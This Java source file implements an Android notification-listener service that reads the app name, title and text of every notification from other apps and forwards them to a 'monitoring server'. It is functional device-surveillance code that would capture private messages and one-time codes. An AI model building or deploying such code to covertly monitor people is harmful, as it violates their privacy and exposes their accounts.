package com.example.control;

import android.app.Notification;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

/**
 * Service that listens for notifications on the device
 * Captures notification content and sends it to the monitoring server
 */
public class NotificationListenerService extends android.service.notification.NotificationListenerService {
    
    private static final String TAG = "NotificationListener";
    private ApiService apiService;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Notification Listener Service created");
        apiService = ApiService.getInstance(getApplicationContext());
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            
            Notification notification = sbn.getNotification();
            if (notification == null) return;
            
            Bundle extras = notification.extras;
            if (extras == null) return;
            
            String title = extras.getString(Notification.EXTRA_TITLE);
            String text = extras.getString(Notification.EXTRA_TEXT);
            
            // Skip our own notifications and system notifications
            if (packageName.equals(getPackageName()) || 
                packageName.equals("android") || 
                packageName.equals("com.android.systemui")) {
                return;
            }
            
            // Log the notification data
            Log.d(TAG, "Notification from: " + packageName);
            Log.d(TAG, "Title: " + (title != null ? title : "null"));
            Log.d(TAG, "Text: " + (text != null ? text : "null"));
            
            // Send the notification data to the server
            sendNotificationToServer(packageName, title, text);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }
    
    private void sendNotificationToServer(String packageName, String title, String text) {
        try {
            // Format notification data for API
            String notificationData = String.format(
                "{\"app\":\"%s\",\"title\":\"%s\",\"text\":\"%s\",\"time\":%d}",
                packageName,
                title != null ? title.replace("\"", "\\\"") : "",
                text != null ? text.replace("\"", "\\\"") : "",
                System.currentTimeMillis()
            );
            
            // Send to API service
            apiService.sendEventData("notifications", notificationData);
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send notification to server", e);
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Not needed for monitoring
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Notification Listener Service destroyed");
    }
}